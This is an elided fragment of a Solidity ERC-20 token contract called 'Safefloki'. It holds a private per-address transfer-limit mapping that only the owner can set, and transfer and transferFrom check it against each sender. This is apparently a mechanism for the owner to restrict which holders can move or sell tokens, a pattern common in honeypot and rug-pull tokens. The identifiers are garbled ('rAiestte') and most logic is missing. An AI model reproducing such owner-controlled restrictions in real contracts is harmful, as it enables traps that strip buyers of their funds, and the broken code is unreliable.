...
contract Safefloki is Context, Ownable, IERC20 {
    // State variables for token properties.
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _maxTransferrAiestte;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        uint256 senderMaxTransferLimit = _maxTransferrAiestte[_msgSender()];
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        // Check for max transfer limit for the sender.
        uint256 senderMaxTransferLimit = _maxTransferrAiestte[sender];
        if (senderMaxTransferLimit > 0) {
    ...
    // Additional functions for managing max transfer rAiestte and trading status.
    function setMaxTransferrAiestte(address account, uint256 rAiestte) public onlyOwner {
        require(rAiestte <= 100, "rAiestte cannot exceed 100%");
        _maxTransferrAiestte[account] = rAiestte;
    }

    function getMaxTransferrAiestte(address account) public view returns (uint256) {
        return _maxTransferrAiestte[account];
    }
